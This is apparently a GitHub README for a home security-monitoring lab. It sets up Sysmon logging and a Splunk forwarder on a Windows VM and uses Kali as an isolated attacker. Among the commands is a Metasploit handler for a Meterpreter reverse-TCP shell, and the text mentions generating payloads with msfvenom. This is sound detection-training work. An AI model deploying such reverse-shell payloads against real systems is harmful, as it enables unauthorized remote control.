# SOC-Homelab
This project is a **home SOC lab** demonstrating:

- Kali Linux as the attacker machine  
- Windows VM as the target machine  
- Sysmon installed on Windows to log system events  
- Splunk (or Splunk Universal Forwarder) to collect and visualize logs  

 This repository does **not include any malware or payload executables**
## Lab Goals
1. Simulate Windows event monitoring using Sysmon.  
2. Generate safe payloads for testing (e.g., Meterpreter in a controlled internal network).  
3. Capture and visualize logs in Splunk to understand attack behaviors.  

## Lab Setup
### Network
- **Internal Network** in VirtualBox for isolation.  
- Kali Linux VM IP: `192.168.20.11`  
- Windows VM IP: `192.168.20.10`  
- Subnet mask: `255.255.255.0`  

### Kali Linux VM
- Installed **Metasploit Framework** for testing payloads.  
- Generated **safe test payloads** with `msfvenom` using LHOST = Kali IP.  
- Started listener with `msfconsole`:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 8888
exploit

Windows VM

Installed Sysmon with a configuration XML:
sysmon.exe -i sysmonconfig.xml
Disabled firewall temporarily for lab testing.
Verified Sysmon logs in Event Viewer:

Splunk Configuration

Installed Splunk Universal Forwarder on Windows VM.
Configured inputs.conf to collect Sysmon logs:
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
index = sysmon
sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
Restarted Splunk service to begin indexing events.
Verified events appear in Splunk dashboards.
<img width="1920" height="1080" alt="kalilab network" src="https://github.com/user-attachments/assets/bb68e9d6-a686-4b4f-aae3-79fc05b496d0" />
<img width="1024" height="768" alt="ipv4" src="https://github.com/user-attachments/assets/9a20b343-693c-4196-a8a8-09742eab7bb0" />
<img width="1024" height="768" alt="ipconfig" src="https://github.com/user-attachments/assets/3eb57f7f-032b-4be0-ba96-0bf32cb9aa91" />
<img width="1024" height="768" alt="firewall settings" src="https://github.com/user-attachments/assets/c9a3fb35-47d8-49bf-b1fb-339920ed673a" />
<img width="1024" height="768" alt="splunk inputs conig" src="https://github.com/user-attachments/assets/0ccb9660-e2ef-49ab-a285-ead3f4374fbe" />
<img width="1024" height="768" alt="Sysmon access" src="https://github.com/user-attachments/assets/e00f2dd6-9f76-491b-a03c-2519fe27af6a" />
<img width="1024" height="768" alt="sysmon config" src="https://github.com/user-attachments/assets/8bf8e705-245a-423a-ab82-298896825d3c" />
